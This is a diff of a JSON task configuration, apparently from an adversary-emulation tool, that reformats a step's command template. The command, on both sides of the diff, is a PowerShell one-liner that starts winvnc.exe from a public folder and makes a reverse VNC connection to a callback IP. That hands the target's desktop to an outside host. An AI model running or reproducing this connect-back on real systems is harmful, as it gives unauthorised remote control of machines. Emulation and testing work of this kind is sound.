@@ -170,28 +170,7 @@
                 "target": "self.target_1"
             },
             "tune": {
-                "command": {
-                    "template": [
-                        "powershell &{Start-Process C:\\Users\\Public\\vnc-kit\\winvnc.exe; Start-sleep 5; C:\\Users\\Public\\vnc-kit\\winvnc.exe -connect",
-                        {
-                            "kind": "slice",
-                            "slice": 0,
-                            "value": {
-                                "kind": "call",
-                                "func": {
-                                    "kind": "attribute",
-                                    "attr": "split",
-                                    "value": "self.tool_call_back_ip"
-                                },
-                                "args": [
-                                    "/",
-                                    1
-                                ]
-                            }
-                        },
-                        "; echo 'Executed VNC Connect Back'; }"
-                    ]
-                }
+                "command": "powershell &{Start-Process C:\\Users\\Public\\vnc-kit\\winvnc.exe; Start-sleep 5; C:\\Users\\Public\\vnc-kit\\winvnc.exe -connect${{'kind': 'slice', 'slice': 0, 'value': {'kind': 'call', 'func': {'kind': 'attribute', 'attr': 'split', 'value': 'self.tool_call_back_ip'}, 'args': ['/', 1]}}}; echo 'Executed VNC Connect Back'; }"
             }
         },
         {
